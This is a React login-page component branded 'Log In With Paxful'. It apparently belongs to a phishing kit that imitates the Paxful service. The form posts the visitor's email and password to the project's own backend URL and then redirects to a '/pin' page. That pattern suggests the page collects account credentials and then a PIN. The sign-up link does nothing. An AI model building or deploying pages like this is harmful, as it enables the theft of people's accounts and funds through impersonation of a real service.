import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.svg";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="home">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="logo" />
            <div className="paxBtn">English</div>
          </div>
          <div className="title">Log In With Paxful</div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label htmlFor="email">Your Email Address</label>
              <div className="formInput">
                <input
                  name="email"
                  type="email"
                  required
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />
              <label htmlFor="password">Your Password</label>
              <div className="formInput">
                <input
                  name="password"
                  type="password"
                  required
                  {...register("password")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="password" />
              <button type="submit" className="homeBtn" disabled={loading}>
                {loading ? "Loading..." : "Log In"}
              </button>
            </form>

            <div className="fgp">
              <p>New on Paxful?</p> <span>Create an Account</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
